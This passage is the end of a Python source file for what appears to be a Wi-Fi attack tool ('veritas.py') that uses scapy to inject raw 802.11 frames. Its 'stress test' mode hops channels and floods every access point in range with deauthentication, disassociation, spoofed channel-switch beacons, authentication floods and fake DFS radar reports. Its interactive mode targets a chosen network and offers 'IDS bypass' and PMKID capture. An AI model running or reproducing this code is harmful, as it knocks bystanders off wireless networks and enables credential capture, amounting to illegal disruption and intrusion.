        f"  {C.DIM_GRAY}[{C.CYAN}{time.strftime('%H:%M:%S')}{C.DIM_GRAY}]{R} {C.AQUA}Nebula session completed.{R}",
        f"  {C.DIM_GRAY}[{C.CYAN}{time.strftime('%H:%M:%S')}{C.DIM_GRAY}]{R} {C.ICE}Channels restored.{R}",
        f"  {C.DIM_GRAY}[{C.CYAN}{time.strftime('%H:%M:%S')}{C.DIM_GRAY}]{R} {C.WHITE_B}Operation finished.{R}",
        f"\n  {C.DIM_GRAY}{' ═' * 28}{R}\n",
    ]
    
    for line in lines:
        for ch in line:
            sys.stdout.write(ch)
            sys.stdout.flush()
            time.sleep(0.001)
        sys.stdout.write('\n')
    
    try:
        subprocess.run(["iw", "dev", iface, "set", "channel", str(curr_ch)],
                      capture_output=True, timeout=3)
    except Exception:
        pass


# ============================================================
#               SIGNAL HANDLER
# ============================================================

def signal_handler(sig, frame):
    state.stop_event.set()


# ============================================================
#               PRE-FLIGHT CHECKS
# ============================================================

def pre_flight():
    print(f"\n  {C.CYAN}{B}[*] QUANTUM INITIALIZATION...{R}\n")
    
    checks = []
    checks.append(("ROOT", os.geteuid() == 0, True))
    
    try:
        import scapy
        checks.append(("SCAPY", True, True))
    except Exception:
        checks.append(("SCAPY", False, True))
    
    for tool, critical in [("iw", True), ("airodump-ng", False),
                            ("xterm", False), ("hostapd", False)]:
        try:
            subprocess.run(["which", tool], capture_output=True, check=True)
            checks.append((tool.upper(), True, critical))
        except Exception:
            checks.append((tool.upper(), False, critical))
    
    critical_fail = False
    for name, ok, critical in checks:
        if ok:
            print(f"  {C.DIM_GRAY}[{C.AQUA}✓{C.DIM_GRAY}]{R} {C.WHITE}{name:<12}{R} {C.DIM}{C.GRAY}...{R} {C.AQUA}OK{R}")
        else:
            sym = C.RED if critical else C.YELLOW
            status = "FAIL" if critical else "WARN"
            print(f"  {C.DIM_GRAY}[{sym}{'✗' if critical else '⚠'}{C.DIM_GRAY}]{R} {C.WHITE}{name:<12}{R} {C.DIM}{C.GRAY}...{R} {sym}{status}{R}")
            if critical:
                critical_fail = True
    
    if critical_fail:
        print(f"\n  {C.RED}[!] Critical pre-flight failed.{R}")
        sys.exit(1)
    
    print(f"\n  {C.DIM_GRAY}[{C.CYAN}{time.strftime('%H:%M:%S')}{C.DIM_GRAY}]{R} {C.AQUA}System armed.{R}\n")
    return True


# ============================================================
#               MAIN
# ============================================================

def run_stress_mode(iface: str, scan_5ghz: bool = False, mode: AttackMode = AttackMode.MEDIUM, vectors: List[AttackVector] = None, duration: int = 0) -> None:
    """Stress Test / Mass Injection Mode (mdk4-style) for Python."""
    if vectors is None:
        vectors = [
            AttackVector.DEAUTH_FLOOD,
            AttackVector.DISASSOC_FLOOD,
            AttackVector.CSA_BEACON,
            AttackVector.AUTH_DOS,
        ]
    
    print(f"\n  {C.RED}{B}╔═══════════════════════════════════════════════╗{R}")
    print(f"  {C.RED}{B}║  STRESS TEST — MASS INJECTION ACTIVE          ║{R}")
    print(f"  {C.RED}{B}║  All Wi-Fi signals in range will be targeted  ║{R}")
    print(f"  {C.RED}{B}╚═══════════════════════════════════════════════╝{R}\n")
    print(f"  {C.GRAY}Interface:{R} {C.CYAN}{iface}{R}")
    print(f"  {C.GRAY}Mode:     {R} {C.RED}{mode.name}{R}")
    print(f"  {C.GRAY}Band:     {R} {C.ICE}{'2.4GHz + 5GHz' if scan_5ghz else '2.4GHz only'}{R}")
    print(f"  {C.GRAY}Vectors:  {R} {C.AQUA}{len(vectors)} active{R}\n")
    
    ch_24 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
    ch_5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165]
    channels = ch_24 + (ch_5 if scan_5ghz else [])
    
    dwell_map = {
        AttackMode.STEALTH: 0.5,
        AttackMode.LOW: 0.35,
        AttackMode.MEDIUM: 0.20,
        AttackMode.HIGH: 0.10,
        AttackMode.INSANE: 0.05,
    }
    dwell = dwell_map.get(mode, 0.2)
    
    ap_pool = {}  # bssid -> {bssid, ssid, channel, tx_count, last_seen}
    pool_lock = threading.Lock()
    current_channel = [1]
    
    state.start_time = time.time()
    state.stop_event.clear()
    signal.signal(signal.SIGINT, signal_handler)
    
    def hopper_loop():
        idx = 0
        while not state.stop_event.is_set():
            ch = channels[idx % len(channels)]
            current_channel[0] = ch
            subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)], capture_output=True)
            idx += 1
            time.sleep(dwell)
            
    def sniffer_loop():
        rt = RadioTapEngine.make_radiotap()
        def prn(pkt):
            if state.stop_event.is_set():
                return
            if pkt.haslayer(Dot11Beacon):
                bssid = pkt[Dot11].addr2
                if not bssid or bssid.startswith("01:"):
                    return
                ssid = ""
                ch = current_channel[0]
                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 0 and elt.info:
                        try:
                            ssid = elt.info.decode('utf-8', errors='ignore')
                        except Exception:
                            ssid = ""
                    elif elt.ID == 3 and elt.info:
                        ch = int(elt.info[0])
                    elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt.payload, 'getlayer') else None
                
                with pool_lock:
                    if bssid not in ap_pool and len(ap_pool) < 128:
                        ap_pool[bssid] = {"bssid": bssid, "ssid": ssid, "channel": ch, "tx_count": 0, "last_seen": time.time()}
                    elif bssid in ap_pool:
                        ap_pool[bssid]["last_seen"] = time.time()
                        ap_pool[bssid]["channel"] = ch
                        if ssid and not ap_pool[bssid]["ssid"]:
                            ap_pool[bssid]["ssid"] = ssid

        try:
            sniff(iface=iface, prn=prn, store=False, stop_filter=lambda _: state.stop_event.is_set())
        except Exception:
            pass

    def injector_loop():
        rt = RadioTapEngine.make_radiotap()
        seq = 0
        while not state.stop_event.is_set():
            with pool_lock:
                aps = list(ap_pool.values())
            if not aps:
                time.sleep(0.3)
                continue
            
            cur_ch = current_channel[0]
            for ap in aps:
                if state.stop_event.is_set():
                    break
                if ap["channel"] != cur_ch:
                    continue
                
                bssid = ap["bssid"]
                ssid = ap["ssid"] or "Unknown"
                sent_cnt = 0
                
                pkts_to_send = []
                if AttackVector.DEAUTH_FLOOD in vectors:
                    pkts_to_send.append(RadioTapEngine.make_deauth(rt, bssid, "ff:ff:ff:ff:ff:ff"))
                if AttackVector.DISASSOC_FLOOD in vectors:
                    pkts_to_send.append(RadioTapEngine.make_disassoc(rt, bssid, "ff:ff:ff:ff:ff:ff"))
                if AttackVector.CSA_BEACON in vectors:
                    redir = cur_ch + 3 if cur_ch < 10 else cur_ch - 3
                    pkts_to_send.append(RadioTapEngine.make_beacon(rt, bssid, ssid, redir if redir > 0 else 11))
                if AttackVector.AUTH_DOS in vectors:
                    fake_mac = ':'.join(f'{random.randint(0,255):02x}' for _ in range(6))
                    pkts_to_send.append(RadioTapEngine.make_auth_frame(rt, bssid, fake_mac))
                if AttackVector.DFS_FAKE_RADAR in vectors:
                    fake_cli = ':'.join(f'{random.randint(0,255):02x}' for _ in range(6))
                    dfs_set = {52, 56, 60, 64} | set(range(100, 145))
                    safe = 36 if cur_ch >= 36 else 1
                    if safe in dfs_set:
                        safe = 36
                    pkts_to_send.append(RadioTapEngine.make_dfs_radar_report(
                        rt, bssid, fake_cli, cur_ch))
                    pkts_to_send.append(RadioTapEngine.make_dfs_vacate_csa(
                        rt, bssid, ssid, cur_ch, safe))
                
                for p in pkts_to_send:
                    try:
                        sendp(p, iface=iface, verbose=False, monitor=True)
                        state.pkts_sent += 1
                        sent_cnt += 1
                    except Exception:
                        state.pkts_fail += 1
                
                with pool_lock:
                    if bssid in ap_pool:
                        ap_pool[bssid]["tx_count"] += sent_cnt
                
                time.sleep(0.01)
            time.sleep(0.05)

    def display_loop():
        os.system('clear')
        sys.stdout.write("\033[?25l")
        sys.stdout.flush()
        while not state.stop_event.is_set():
            elapsed = max(0.1, time.time() - state.start_time)
            h, m, s = int(elapsed // 3600), int((elapsed % 3600) // 60), int(elapsed % 60)
            pps = state.pkts_sent / elapsed
            
            with pool_lock:
                aps = list(ap_pool.values())
            
            sys.stdout.write("\033[H")
            sys.stdout.write(f"  {C.DEEP_B}╔{'═'*58}╗{R}\n")
            sys.stdout.write(f"  ║{C.RED}{B}   VERITAS — STRESS TEST (MASS INJECTION)               {R}{C.DEEP_B}║{R}\n")
            sys.stdout.write(f"  {C.DEEP_B}╠{'═'*58}╣{R}\n")
            sys.stdout.write(f"  ║ {C.GRAY}IF  {R}{C.CYAN}{iface:<20}{R}  {C.GRAY}MODE {R}{C.RED}{mode.name:<18}{R}║\033[K\n")
            sys.stdout.write(f"  ║ {C.GRAY}APs {R}{C.AQUA}{len(aps):<4}{R} discovered        {C.GRAY}CH {R}{C.YELLOW}{current_channel[0]:<3}{R} / {C.ICE}{len(channels)}{R}          ║\033[K\n")
            sys.stdout.write(f"  ║ {C.GRAY}TX  {R}{C.AQUA}{state.pkts_sent:<12}{R}  {C.GRAY}FAIL {R}{C.RED if state.pkts_fail > 0 else C.GRAY}{state.pkts_fail:<6}{R}  {C.GRAY}RATE {R}{C.ICE}{pps:.1f} pps{R}       ║\033[K\n")
            sys.stdout.write(f"  ║ {C.GRAY}TIME{R} {C.CYAN}{h:02d}:{m:02d}:{s:02d}{R}                                             ║\033[K\n")
            sys.stdout.write(f"  {C.DEEP_B}╠{'═'*58}╣{R}\n")
            sys.stdout.write(f"  ║ {C.GRAY}  CH  BSSID              SSID              TX            {R}║\033[K\n")
            sys.stdout.write(f"  {C.DEEP_B}╠{'═'*58}╣{R}\n")
            
            aps_sorted = sorted(aps, key=lambda x: x["channel"])
            for ap in aps_sorted[:15]:
                ssid_disp = (ap["ssid"][:18] if ap["ssid"] else "<hidden>")
                ch_color = C.GREEN if ap["channel"] == current_channel[0] else C.GRAY
                sys.stdout.write(f"  ║ {ch_color}{ap['channel']:>3}{R}  {ap['bssid']:<18} {ssid_disp:<18} {ap['tx_count']:<10}    ║\033[K\n")
            
            sys.stdout.write(f"  {C.DEEP_B}╚{'═'*58}╝{R}\n")
            sys.stdout.write(f"  {C.DIM_GRAY}[{C.RED}Ctrl+C{R}{C.DIM_GRAY}]{R} stop   {C.GRAY}APs:{R}{C.AQUA}{len(aps)}{R}  {C.GRAY}TX:{R}{C.AQUA}{state.pkts_sent}{R}\n")
            sys.stdout.flush()
            time.sleep(0.2)
        sys.stdout.write("\033[?25h\n")
        sys.stdout.flush()

    t_hop = threading.Thread(target=hopper_loop, daemon=True)
    t_sniff = threading.Thread(target=sniffer_loop, daemon=True)
    t_inj = threading.Thread(target=injector_loop, daemon=True)
    t_disp = threading.Thread(target=display_loop, daemon=True)
    
    t_hop.start()
    t_sniff.start()
    t_inj.start()
    t_disp.start()
    
    try:
        if duration > 0:
            end_time = time.time() + duration
            while not state.stop_event.is_set() and time.time() < end_time:
                time.sleep(1)
            state.stop_event.set()
        else:
            while not state.stop_event.is_set():
                time.sleep(1)
    except KeyboardInterrupt:
        state.stop_event.set()
    finally:
        subprocess.run(["iw", "dev", iface, "set", "channel", "1"], capture_output=True)
        print(f"\n  {C.AQUA}[✓] Stress test complete. Total TX: {state.pkts_sent}{R}\n")


def run_script_mode(script_path: str) -> None:
    try:
        with open(script_path, 'r') as f:
            cfg = json.load(f)
    except Exception as e:
        print(f"{C.RED}[!] Failed to load script: {e}{R}")
        sys.exit(1)
    
    iface = cfg.get("interface", "")
    if not iface:
        print(f"{C.RED}[!] 'interface' required in script JSON{R}")
        sys.exit(1)
    
    if cfg.get("stress_mode", False):
        scan_5ghz = cfg.get("scan_5ghz", False)
        duration = cfg.get("duration", 0)
        mode_map = {m.name: m for m in AttackMode}
        mode = mode_map.get(cfg.get("mode", "MEDIUM").upper(), AttackMode.MEDIUM)
        vector_map = {v.value: v for v in AttackVector}
        vectors = [vector_map[n] for n in cfg.get("vectors", []) if n in vector_map]
        run_stress_mode(iface, scan_5ghz=scan_5ghz, mode=mode, vectors=vectors or None, duration=duration)
        return
    
    target = TargetAP(
        bssid=cfg.get("target_bssid", ""),
        ssid=cfg.get("target_ssid", "Unknown"),
        channel=cfg.get("target_channel", 6)
    )
    new_ch = cfg.get("new_channel", 1)
    client_mac = cfg.get("client_mac", "ff:ff:ff:ff:ff:ff")
    duration = cfg.get("duration", 0)
    refresh_rate = cfg.get("refresh_rate", 0.1)
    stats_file = cfg.get("stats_file", "")
    
    if new_ch > 255:
        print(f"{C.RED}[!] new_channel {new_ch} > 255 cannot be encoded in 1-byte CSA element{R}")
        print(f"{C.YELLOW}   Use channels 1-255 only.{R}")
        sys.exit(1)
    
    vector_map = {v.value: v for v in AttackVector}
    vectors = [vector_map[n] for n in cfg.get("vectors", []) if n in vector_map]
    if not vectors:
        vectors = [AttackVector.CSA_BEACON]
    
    mode_map = {m.name: m for m in AttackMode}
    mode = mode_map.get(cfg.get("mode", "MEDIUM").upper(), AttackMode.MEDIUM)
    
    config = AttackConfig(
        vectors=vectors, mode=mode,
        iface_primary=iface, new_channel=new_ch,
        client_mac=client_mac, duration=duration,
    )
    
    print(f"\n  {C.CYAN}[SCRIPT] Loading: {script_path}{R}")
    print(f"  {C.CYAN}[SCRIPT] Target: {target.bssid} ({target.ssid}) ch{target.channel} → {new_ch}{R}")
    print(f"  {C.CYAN}[SCRIPT] Mode: {mode.name}, Vectors: {len(vectors)}{R}\n")
    
    subprocess.run(["iw", "dev", iface, "set", "channel", str(target.channel)],
                  capture_output=True)
    time.sleep(0.5)
    
    try:
        factory = PacketFactory(config, target, new_ch, client_mac)
    except ValueError as e:
        print(f"{C.RED}[!] Packet factory error: {e}{R}")
        sys.exit(1)
    
    engine = InjectionEngine(config, factory)
    hopper = ChannelHopper(config, target)
    display = HologramDisplay(config, target, refresh_rate=refresh_rate,
                              stats_file=stats_file)
    capture = CaptureEngine(config)
    
    state.start_time = time.time()
    signal.signal(signal.SIGINT, signal_handler)
    
    hopper.start()
    capture.start()
    display.start()
    engine.start()
    
    try:
        if duration > 0:
            end_time = time.time() + duration
            while not state.stop_event.is_set() and time.time() < end_time:
                time.sleep(1)
            state.stop_event.set()
        else:
            while not state.stop_event.is_set():
                time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        engine.stop()
        holo_exit(iface, target.bssid, target.ssid, target.channel, new_ch)


def main():
    if os.geteuid() != 0:
        print(f"{C.RED}[!] Run as root: sudo python3 veritas.py{R}")
        sys.exit(1)
    
    if not SCAPY_AVAILABLE:
        print(f"{C.RED}[!] Scapy not installed. Install: pip3 install scapy{R}")
        sys.exit(1)
    
    if len(sys.argv) >= 2 and (sys.argv[1] == '--help' or sys.argv[1] == '-h'):
        print(BANNER)
        print("Usage:")
        print("  sudo python3 veritas.py                     Interactive mode")
        print("  sudo python3 veritas.py --stress            Stress test mode (mass injection)")
        print("  sudo python3 veritas.py --script <json>     Script/automated mode")
        print("  sudo python3 veritas.py --help              Show this help\n")
        sys.exit(0)
        
    if len(sys.argv) >= 3 and sys.argv[1] == '--script':
        os.system('clear')
        print(BANNER)
        pre_flight()
        run_script_mode(sys.argv[2])
        return

    stress_mode = '--stress' in sys.argv
    scan_5ghz = '--5ghz' in sys.argv
    
    if stress_mode:
        os.system('clear')
        print(BANNER)
        pre_flight()
        iface = select_interface()
        run_stress_mode(iface, scan_5ghz=scan_5ghz)
        return
    
    os.system('clear')
    print(BANNER)
    
    pre_flight()
    
    iface = select_interface()
    print(f"\n  {C.AQUA}{SYM.CHECK} Interface: {C.ICE}{iface}{R}\n")
    
    target = select_target(iface)
    print(f"\n  {C.AQUA}{SYM.CHECK} Target: {C.ICE}{target.bssid}{R} "
          f"{C.GRAY}({target.ssid}){R} {C.CYAN}ch {target.channel}{R}\n")
    
    new_ch = get_input(
        "Redirect channel (CSA target)", validate_channel,
        "Invalid! (1-14 / 36-165)", default=str(target.channel + 1 if target.channel < 14 else 1)
    )
    new_ch = int(new_ch)
    
    if new_ch > 255:
        print(f"  {C.RED}[!] Channel {new_ch} > 255 cannot be encoded in CSA element.{R}")
        print(f"  {C.YELLOW}  CSA uses 1 byte for channel number. Max is 255.{R}")
        print(f"  {C.YELLOW}  Continuing anyway - frame may be malformed.{R}")
    
    print(f"\n  {C.DIM_GRAY}┌{'─'*44}┐{R}")
    print(f"  │{C.AQUA}{B}  ◈  CLIENT TARGET  ◈{R}{' '*24}│")
    print(f"  {C.DIM_GRAY}├{'─'*44}┤{R}")
    print(f"  │  {C.CYAN}1{R}{C.GRAY}.{R} {C.ICE}Broadcast{R}  {C.GRAY}— All clients{R}{' '*14}│")
    print(f"  │  {C.CYAN}2{R}{C.GRAY}.{R} {C.ICE}Specific{R}   {C.GRAY}— Single MAC{R}{' '*14}│")
    print(f"  {C.DIM_GRAY}└{'─'*44}┘{R}\n")
    
    try:
        ct = input(f"  {C.ELECTRIC}▸{R} {C.LIGHT_B}Client [1-2]{R} {C.GRAY}[1]{R}: ").strip()
    except Exception:
        ct = "1"
    
    client_mac = "ff:ff:ff:ff:ff:ff"
    if ct == "2":
        client_mac = get_input("Client MAC", validate_mac, "Invalid MAC!")
    
    vectors = select_vectors()
    mode = select_attack_mode()
    
    print(f"\n  {C.DIM_GRAY}┌{'─'*44}┐{R}")
    print(f"  │{C.AQUA}{B}  ◈  ADVANCED OPTIONS  ◈{R}{' '*20}│")
    print(f"  {C.DIM_GRAY}├{'─'*44}┤{R}")
    print(f"  │  {C.CYAN}1{R}{C.GRAY}.{R} {C.ICE}Single interface{R}{' '*17}│")
    print(f"  │  {C.CYAN}2{R}{C.GRAY}.{R} {C.ICE}Dual radio (if available){R}{' '*8}│")
    print(f"  {C.DIM_GRAY}├{'─'*44}┤{R}")
    print(f"  │  {C.CYAN}3{R}{C.GRAY}.{R} {C.ICE}Normal mode{R}{' '*20}│")
    print(f"  │  {C.CYAN}4{R}{C.GRAY}.{R} {C.ICE}IDS bypass{R} {C.ORANGE}🔥{R}{' '*16}│")
    print(f"  {C.DIM_GRAY}├{'─'*44}┤{R}")
    print(f"  │  {C.CYAN}5{R}{C.GRAY}.{R} {C.ICE}Enable PMKID capture{R}{' '*12}│")
    print(f"  {C.DIM_GRAY}└{'─'*44}┘{R}\n")
    
    config = AttackConfig(
        vectors=vectors,
        mode=mode,
        iface_primary=iface,
        new_channel=new_ch,
        client_mac=client_mac,
    )
    
    print(f"\n  {C.DIM_GRAY}{'─'*56}{R}\n")
    print(f"  {C.YELLOW}{B}{SYM.BOLT} DEPLOY NEBULA?{R}\n")
    
    print(f"  {C.DEEP_B}╔{'═'*52}╗{R}")
    print(f"  ║ {C.SKY}Interface{R}  {C.DIM_GRAY}:{R} {C.CYAN}{iface:<41}{R} ║")
    print(f"  ║ {C.SKY}BSSID{R}      {C.DIM_GRAY}:{R} {C.ICE}{target.bssid:<41}{R} ║")
    print(f"  ║ {C.SKY}SSID{R}       {C.DIM_GRAY}:{R} {C.WHITE_B}{target.ssid:<41}{R} ║")
    print(f"  ║ {C.SKY}Channel{R}    {C.DIM_GRAY}:{R} {C.RED}{target.channel}{R} {C.DIM_GRAY}→{R} {C.AQUA}{new_ch}{R}                   ║")
    print(f"  ║ {C.SKY}Client{R}     {C.DIM_GRAY}:{R} {C.ICE}{client_mac:<41}{R} ║")
    print(f"  ║ {C.SKY}Vectors{R}    {C.DIM_GRAY}:{R} {C.AQUA}{len(vectors)} selected{R}{' '*31}║")
    print(f"  ║ {C.SKY}Mode{R}       {C.DIM_GRAY}:{R} {C.CYAN}{mode.name}{R}{' '*37}║")
    print(f"  {C.DEEP_B}╚{'═'*52}╝{R}")
    
    try:
        confirm = input(f"\n  {C.RED}{B}❯ DEPLOY?{R} {C.AQUA}(y/N){R}: ").strip().lower()
    except Exception:
        print(f"\n  {C.YELLOW}Aborted.{R}")
        sys.exit(0)
    
    if confirm != 'y':
        print(f"  {C.YELLOW}Cancelled.{R}")
        sys.exit(0)
    
    print(f"\n  {C.YELLOW}[*] Locking {iface} to ch {target.channel}...{R}")
    subprocess.run(["iw", "dev", iface, "set", "channel", str(target.channel)],
                  capture_output=True)
    time.sleep(0.5)
    
    try:
        factory = PacketFactory(config, target, new_ch, client_mac)
    except ValueError as e:
        print(f"  {C.RED}[!] Packet factory error: {e}{R}")
        sys.exit(1)
    
    engine = InjectionEngine(config, factory)
    hopper = ChannelHopper(config, target)
    print(f"  {C.YELLOW}[*] Spawning Hollywood terminals...{R}")
    spawn_hollywood_terminals(iface, target.bssid, target.ssid, target.channel, new_ch)
    
    display = HologramDisplay(config, target)
    capture = CaptureEngine(config)
    
    state.start_time = time.time()
    signal.signal(signal.SIGINT, signal_handler)
    
    print(f"  {C.AQUA}[✓] System deployed.{R}")
    print(f"  {C.CYAN}[⚡] Veritas engaged — {C.ICE}{mode.name}{R}\n")
    
    hopper.start()
    capture.start()
    display.start()
    engine.start()
    
    try:
        while not state.stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        engine.stop()
        holo_exit(iface, target.bssid, target.ssid, target.channel, new_ch)


if __name__ == "__main__":
    main()